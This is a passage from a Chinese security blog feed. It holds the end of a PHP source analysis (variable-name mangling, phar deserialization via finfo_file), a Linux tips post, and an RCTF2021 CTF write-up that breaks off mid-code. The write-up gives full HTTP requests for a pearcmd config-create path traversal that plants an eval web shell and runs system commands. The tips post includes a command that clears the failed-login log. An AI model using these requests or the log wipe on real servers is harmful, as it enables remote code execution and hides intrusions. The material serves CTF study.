(Z_TYPE_P(gpc_element_p) == IS_INDIRECT) &#123;<br>gpc_element_p = Z_INDIRECT_P(gpc_element_p);<br>&#125;<br><span class="hljs-keyword">if</span> (Z_TYPE_P(gpc_element_p) != IS_ARRAY) &#123;<br>zval_ptr_dtor_nogc(gpc_element_p);<br>array_init(gpc_element_p);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>SEPARATE_ARRAY(gpc_element_p);<br>&#125;<br>&#125;<br>&#125;<br>symtable1 = Z_ARRVAL_P(gpc_element_p);<br><span class="hljs-comment">/* ip pointed to the &#x27;[&#x27; character, now obtain the key */</span><br>index = index_s;<br>index_len = new_idx_len;<br><br>ip++;<br><span class="hljs-keyword">if</span> (*ip == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>is_array = <span class="hljs-number">1</span>;<br>*ip = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">goto</span> plain_var;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br></code></pre></td></tr></table></figure><p>总结一下吧</p><p>对于 ‘ ‘ 和  ‘.’ 成因在于,算是隐性的PHP特性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;<br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于’[‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (p = var; *p; p++) &#123;<br><span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27; &#x27;</span> || *p == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;   <span class="hljs-comment">//空格 和 点 会被替换成下划线 </span><br>*p=<span class="hljs-string">&#x27;_&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;  <span class="hljs-comment">//如果变量的数组存在 [ 会被认为是array型的变量</span><br>is_array = <span class="hljs-number">1</span>;   <span class="hljs-comment">//数组标志位</span><br>ip = p;<br>*p = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (is_array) &#123;<br>...<br>           ip++;<br>index_s = ip;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">isspace</span>(*ip)) &#123;<br>ip++;<br>&#125;<br><span class="hljs-keyword">if</span> (*ip==<span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>index_s = <span class="hljs-literal">NULL</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ip = <span class="hljs-built_in">strchr</span>(ip, <span class="hljs-string">&#x27;]&#x27;</span>);<br><span class="hljs-keyword">if</span> (!ip) &#123;<br><span class="hljs-comment">/* PHP variables cannot contain &#x27;[&#x27; in their names, so we replace the character with a &#x27;_&#x27; */</span><br>*(index_s - <span class="hljs-number">1</span>) = <span class="hljs-string">&#x27;_&#x27;</span>;  <span class="hljs-comment">//这里就是&#x27;[&#x27;被替换成&#x27;_&#x27;的原因了 在处理数组的逻辑中如果找不到对应的 &#x27;[&#x27;就 替换为 &#x27;_&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="可反序列化函数成因"><a href="#可反序列化函数成因" class="headerlink" title="可反序列化函数成因"></a>可反序列化函数成因</h3><p>phar反序列化触发函数<code>finfo_file/finfo_buffer/mime_content_type</code></p><p>做题遇到的 稍微看看这里只看finfo_file这个函数</p><p>首先看看为什么phar可以用来做反序列化，在<code>/ext/phar/phar.c#line618</code>处phar在处理元数据(metadata)时调用了反序列化函数，如图</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111149335.png" alt="image-20220111114936225">然后来看看 finfo_file 是如何触发反序列化的</p><p>追踪到 <code>/ext/fileinfo/fileinfo.c#line600</code> 发现了 finfo_file具体实现的函数_php_finfo_get_type</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111149947.png" alt="image-20220111114944892"></p><p>跟进 _php_finfo_get_type #line432处，发现_php_finfo_get_type 的实现方法</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111150269.png" alt="image-20220111115006179"></p><p>line553 发现这里有打开文件流的操作，且这行代码一定会执行一遍。这里使用的是php_stream系列的API，可以使用stream_get_wrapper看到系统内注册了哪一些wrapper</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201111150601.png" alt="image-20220111115022534"></p><p>发现了phar 因此我们理解了 finfo_file成为 phar反序列化影响函数的原因。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="PHP" scheme="https://d3n13d.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Linux日常小技巧</title>
    <link href="https://d3n13d.github.io/2022/01/09/Linux%E6%97%A5%E5%B8%B8%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>https://d3n13d.github.io/2022/01/09/Linux%E6%97%A5%E5%B8%B8%E5%B0%8F%E6%8A%80%E5%B7%A7/</id>
    <published>2022-01-09T03:41:43.000Z</published>
    <updated>2022-01-09T03:42:38.161Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux日常使用小技巧"><a href="#Linux日常使用小技巧" class="headerlink" title="Linux日常使用小技巧"></a>Linux日常使用小技巧</h1><h2 id="定义你的环境变量"><a href="#定义你的环境变量" class="headerlink" title="定义你的环境变量"></a>定义你的环境变量</h2><p>基础用法：</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">export var_name=var_value<br></code></pre></td></tr></table></figure><p>永久生效你的环境变量</p><p>把生成环境变量的语句，放到一下任意一文件中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">/etc/profile<br>/etc/profile.d/*.sh<br>/etc/bashrc<br></code></pre></td></tr></table></figure><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;export var_name=var_value&quot; &gt;&gt; /root/.bashrc\<br>source !$    #这个时候重新开一个shell echo $var_name 就可以发现我们的刚刚永久生效了<br></code></pre></td></tr></table></figure><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><blockquote><p>nohup命令 可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端</p></blockquote><p>这个命令常常与 &amp; 相结合</p><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">nohup ping www.baidu.com &amp;  #注意我们不要只会移动到后台执行，但是不知道怎么结束<br><span class="hljs-meta">#</span><span class="bash">下面给一个样例</span><br><span class="hljs-meta">#</span><span class="bash">利用 <span class="hljs-built_in">jobs</span> 命令查看后台进程，然后使用<span class="hljs-built_in">fg</span>命令将后台运行的或挂起的任务（或作业）切换到前台运行</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091033363.png" alt="image-20220109103321273"></p><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><blockquote><p>用来探测给定文件的类型,file命令 用来探测给定文件的类型。</p></blockquote><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">filefilename  #用于帮助我们确定文件类型<br>file /usr/bin/ls  #解读可执行程序<br></code></pre></td></tr></table></figure><h3 id="fgrep"><a href="#fgrep" class="headerlink" title="fgrep"></a>fgrep</h3><blockquote><p>搜索文件中的字符串，只支持搜索字符串</p></blockquote><p>demo:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">fgrep -i flag 1  #在1这个文件中搜索含有flag的字符串<br>返回结果：<br>root@VM-24-13-debian:~# fgrep -i flag 1<br>flag&#123;This_is_test&#125;<br>ASFLAG<br></code></pre></td></tr></table></figure><h3 id="last"><a href="#last" class="headerlink" title="last"></a>last</h3><blockquote><p>列出目前与过去登入系统的用户相关信息</p></blockquote><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">last</span> -<span class="hljs-keyword">a</span>:    <span class="hljs-comment">#把从何处登入系统的主机名称或ip地址，显示在最后一行</span><br><span class="hljs-keyword">last</span> -n    <span class="hljs-comment">#(number不是字母5)</span><br><span class="hljs-keyword">last</span> -F    <span class="hljs-comment">#尽可能详细的说明时间信息</span><br><span class="hljs-keyword">last</span> root <span class="hljs-comment"># 显示root之前登录的信息</span><br></code></pre></td></tr></table></figure><h3 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h3><blockquote><p>列出登入系统失败的用户相关信息，你也许可以利用这个来获得攻击者的信息</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">lastb -a  #还是优先掌握这个吧，实质是读取/var/log/btmp <br>echo &gt; /var/log/btmp  清除lastb对应的文件内容<br></code></pre></td></tr></table></figure><h3 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h3><blockquote><p>用来改变文件属性</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">参数<br>-R 递归处理，将指定目录下的所有文件及子目录一并处理。<br>+&lt;属性&gt; 开启文件或目录的该项属性。<br>-&lt;属性&gt; 关闭文件或目录的该项属性。<br>=&lt;属性&gt; 指定文件或目录的该项属性。<br>i：不得任意更动文件或目录；<br>s：保密性删除文件或目录；<br>a：让文件或目录仅供附加用途<br><br>chattr +i /etc/my.cnf  #用chattr命令防止系统中某个关键文件被修改<br>lsattr /etc/my.cnf  #查看文件属性<br>chattr +a /var/log/message#某个文件只能往里面追加数据，但不能删除，适用于各种日志文件<br></code></pre></td></tr></table></figure><h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><p>几个不错的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">set number     #显示行号<br>set autoindent # 自动缩进<br>/value    #搜索vlaue这个字符串 使用 n进行上下切换<br>/value -c   #大小写不敏感搜索<br><span class="hljs-meta">%</span><span class="bash">s/foo/bar/g  <span class="hljs-comment">#%全局替换 把 foo 替换为bar</span></span>  <br>s/foo/bar/g  #替换当前行的foo<br><span class="hljs-meta">%</span><span class="bash">s/$/123/    <span class="hljs-comment">#在每一行的结尾追加123</span></span><br><span class="hljs-meta">%</span><span class="bash">s/^<span class="hljs-comment">#//      #删每一行开头的#</span></span><br></code></pre></td></tr></table></figure><p>参考公众号：入门小站</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="Linux" scheme="https://d3n13d.github.io/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>RCTF2021部分复现</title>
    <link href="https://d3n13d.github.io/2022/01/08/RCTF2021%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <id>https://d3n13d.github.io/2022/01/08/RCTF2021%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-01-08T14:32:16.000Z</published>
    <updated>2022-01-09T03:43:35.849Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCTF2021复现"><a href="#RCTF2021复现" class="headerlink" title="RCTF2021复现"></a>RCTF2021复现</h1><p>来源：<a href="https://github.com/ccreater222/my-ctf-challenges/tree/master/RCTF2021/">https://github.com/ccreater222/my-ctf-challenges/tree/master/RCTF2021/</a></p><h2 id="VerySafe"><a href="#VerySafe" class="headerlink" title="VerySafe"></a>VerySafe</h2><p>虽然但是，复现有点恶心，环境啥也没有，不得不去看wp</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/ccreater222/my-ctf-challenges.git<br>cd /my-ctf-challenges/RCTF2021/VerySafe/docker/<br>docker-compose up -d<br></code></pre></td></tr></table></figure><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a><strong>前置知识</strong></h3><h4 id="pearcmd实现裸文件包含"><a href="#pearcmd实现裸文件包含" class="headerlink" title="pearcmd实现裸文件包含"></a>pearcmd实现裸文件包含</h4><p>利用条件：</p><ul><li>PHP 开启register_argc_argv</li><li>PHP以Server的形式运行</li></ul><p>pecl是PHP中用于管理扩展而使用的命令行工具，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在<code>/usr/local/lib/php</code></p><p>如图，在拖取下来的镜像中存在 pearcmd.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081736563.png" alt="image-20220108173616492"></p><p>如果这是PHP开启了 <code>register_argc_argv</code> 这个选项，那么我们传入的参数将会被当做命令行参数 argv</p><blockquote><p>RFC3875中规定，如果query-string中不包含没有编码的=，且请求是GET或HEAD，则query-string需要被作为命令行参数。但PHP没有严格按照RFC来处理，即使我们传入的query-string包含等号，也仍会被赋值给$_SERVER[‘argv’]</p></blockquote><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081755960.png" alt="image-20220108175527866"></p><p>接着我们查看 <code>pearcmd.php</code> ，发现config-create参数可以帮助我们创建一个文件，且内容可控，那这个时候就可以写入一个shell</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>构建</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /../usr/local/lib/php/peclcmd.php?+config-create+/tmp/&lt;?=eval($_POST[<span class="hljs-number">1</span>]);?&gt;/*+/tmp/qqqq.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: yourhost:<span class="hljs-number">54120</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /../tmp/hello.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: yourhost:<span class="hljs-number">54120</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">22</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Origin</span>: yourhost<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://yourhost/tmp/hello.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">1</span>=system(&#x27;/readflag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081809313.png" alt="image-20220108180908218"></p><p>成功getFlag</p><p>其他可利用的参数 install，download</p><h2 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h2><p>别看了，没复现出来</p><p>先看看nginx.conf</p><p>server {<br>    listen       80;<br>    listen  [::]:80;<br>    server_name  localhost;</p><div class="code-wrapper"><pre><code class="hljs">#access_log  /var/log/nginx/host.access.log  main;root   /var/www/html;location /admin &#123;    allow 127.0.0.1;   //admin页面只允许127.0.0.1的请求    deny all;&#125;location / &#123;    index  index.php;    try_files $uri @phpfpm;  //看寻找的$document.uri存不存在 不存在找@phpfpm 这里$document在第二行定义为 /var/www/html&#125;#error_page  404              /404.html;# redirect server error pages to the static page /50x.html#error_page   500 502 503 504  /50x.html;location = /50x.html &#123;    root   /usr/share/nginx/html;&#125;# proxy the PHP scripts to Apache listening on 127.0.0.1:80##location ~ \.php$ &#123;#    proxy_pass   http://127.0.0.1;#&#125;# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location @phpfpm &#123;    include        fastcgi_params;    fastcgi_split_path_info ^(.+?\.php)(/.*)$;    fastcgi_pass   php:9000;   //fastcgi服务端口    fastcgi_index  index.php;  //fastcgi默认的主页资源    fastcgi_param  SCRIPT_FILENAME  $document_root/index.php;    fastcgi_param  REQUEST_URI  $uri;   //$uri请求资源给 REQUEST_URI&#125;# deny access to .htaccess files, if Apache&#39;s document root# concurs with nginx&#39;s one##location ~ /\.ht &#123;#    deny  all;#&#125;</code></pre></div><p>index.php 内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;flight/autoload.php&#x27;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">flight</span>\<span class="hljs-title">Engine</span>;<br><span class="hljs-variable">$app</span> = <span class="hljs-keyword">new</span> Engine();<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = uniqid(<span class="hljs-string">&quot;asdfsadf&quot;</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;YouWillNerveKnow&quot;</span>;<span class="hljs-comment">// you will never know the password 唯一标识符</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isdanger</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;  <span class="hljs-comment">//检测危险参数</span><br>    <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$v</span>))&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">if</span>(isdanger(<span class="hljs-variable">$k</span>)||isdanger(<span class="hljs-variable">$value</span>))&#123;  <span class="hljs-comment">//如果传入数组 =&gt; </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$v</span>,<span class="hljs-string">&quot;../&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;  <span class="hljs-comment">//如果存在 ../ =&gt; 危险</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$app</span>-&gt;before(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>,<span class="hljs-variable">$_POST</span>,<span class="hljs-variable">$_COOKIE</span>,<span class="hljs-variable">$_FILES</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">if</span>(isdanger(<span class="hljs-variable">$value</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;go away hack&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;);<br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&#x27;/*&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;head&quot;</span>,[],<span class="hljs-string">&quot;head_content&quot;</span>);<br>    <span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$request</span>-&gt;url,<span class="hljs-string">&quot;login&quot;</span>)!==<span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>])&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/login&quot;</span>);<br>    &#125;<br><br>    <br>&#125;);<br><br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;admin&quot;</span>,[<span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-string">&quot;./&quot;</span>.<span class="hljs-variable">$request</span>-&gt;query-&gt;data],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span 